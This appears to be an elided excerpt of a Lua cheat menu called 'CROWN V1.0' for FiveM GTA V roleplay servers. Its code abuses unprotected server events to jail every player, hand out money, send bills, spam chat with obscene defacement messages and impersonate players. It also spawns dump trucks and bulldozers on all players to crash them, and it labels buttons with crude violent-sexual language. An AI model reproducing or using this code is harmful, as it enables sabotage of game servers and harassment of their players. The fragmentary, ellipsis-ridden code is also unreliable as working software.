...
local function fv()
    ...
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        ...
        TriggerServerEvent('lbrp_vehicleshop:setVehicleOwned', cx)
...
function TiagoMenu.CreateMenu(id, title)
	...
	menus[id].menuBackgroundColor = {r = 79, g = 79, b = 79, a = 10}
...
function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"SERVER FUCKED BY TAPATIO BOYZ")
    end
end
...
function nukeserver()
    Citizen.CreateThread(function()
		...
		while not HasModelLoaded(GetHashKey(dB))do
            Citizen.Wait(0)RequestModel(GetHashKey(dB))
        end
		
		while not HasModelLoaded(GetHashKey(dx))do
            Citizen.Wait(0)RequestModel(GetHashKey(dx))
        end
		
		while not HasModelLoaded(GetHashKey(dQ))do
            Citizen.Wait(0)RequestModel(GetHashKey(dQ))
        end

        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"SERVER FUCKED BY DOSE OF CROWN YOUTUBE")
        end
        ...
        for i=0,128 do
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, " Welcome  v9.7 ")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcome ")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, " Welcome")
					end
				end
			...
			if esxdestroy then
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", " Join CMG British RP", 10000000)
...
local ci = true
        if ci then
			...
			if nuke then
				...
				local heli = "maverick"
                local random = "bus"
                local dumptruck = "DUMP"
                local bulldozer = "DOZER"
                for i = 0, 128 do
                        ...
                        CreateVehicle(GetHashKey(dumptruck),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(dumptruck),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
                        CreateVehicle(GetHashKey(dumptruck),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                        CreateVehicle(GetHashKey(bulldozer),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(bulldozer),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(bulldozer),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
                end
			end
	...
	if sall then
			...
			if spam then
                for i = 0, 128 do
						TriggerServerEvent(
                    '_chat:messageEntered',
                    'FUCK SERVER by TAPATIO BOYZ',
                    {0, 0x99, 255},
                    'FUCK SERVER by TAPATIO BOYZ'
                )
                TriggerServerEvent('_chat:messageEntered', 'YOU GOT FUCKED BY TAPATIO BOYZ', {0, 0x99, 255}, 'YOU GOT FUCKED BY TAPATIO BOYZ')
                end
			end
...
Citizen.CreateThread(
	function()
		...
		TiagoMenu.CreateMenu("MainMenu", "CROWN ~n~~r~V1.0")
		TiagoMenu.SetSubTitle("MainMenu", "VERSION 1.0")
        ...
        while bm do
			...
			if TiagoMenu.IsMenuOpened("MainMenu") then
			    ...
			    drawNotification(" CROWN V1.0  ~n~~h~WELCOME ~r~[~s~ " ..GetPlayerName(PlayerId()).." ~r~]")
				...
				drawNotification("~h~~g~Official Discord: ~s~~n~~h~https://discord.gg/ZcYntJM ~n~~r~Crown#9855")
				...
				elseif TiagoMenu.MenuButton("→  ~h~~y~WORLD ~s~OPTIONS", "World") then
				elseif TiagoMenu.MenuButton("→  ~h~~g~TELEPORT  ~s~OPTIONS", "TeleportMenu") then
		...
		elseif TiagoMenu.Button("~h~~y~(Attention) ~r~PIKA PIKA NUKE") then
                    nukeserver()
	elseif
		TiagoMenu.CheckBox(
 ...
 elseif TiagoMenu.Button("~h~~r~Rape ~s~All Players") then
	 ...
	 local eX = KeyboardInput("Enter player name to be fucked with", "", 100) if eX then local dT = KeyboardInput("Enter message", "", 10000) if dT then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eX, {0, 0x99, 255}, dT) end end
	...
	elseif
		TiagoMenu.CheckBox(
		"~h~~r~Crash ~s~All Players with Crown v1.0",
		nuke,
		function(enabled)
		nuke = enabled
		end)
	...
	elseif TiagoMenu.Button("~h~~r~Ramp all Vehicles") then
    ...
    elseif TiagoMenu.Button("~h~~r~Egg Vehicles") then local cM = GetHashKey("prop_alien_egg_01") for vehicle in EnumerateVehicles() do local cD = CreateObject(cM, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end
    ...
    TriggerEvent('esx_skin:openSaveableMenu')
			...
			elseif TiagoMenu.IsMenuOpened("PlayerOptionsMenu") then
                ...
                elseif TiagoMenu.MenuButton("~h~~p~ Cuff Players (~~y~NON ESX)") then
                local cQ=GetPlayerServerId(SelectedPlayer)
                if cQ then
                    TrigggerServerEvent("_chat:messageEntered","/cuff", "", GetPlayerServerId(SelectedPlayer), result)
                end					
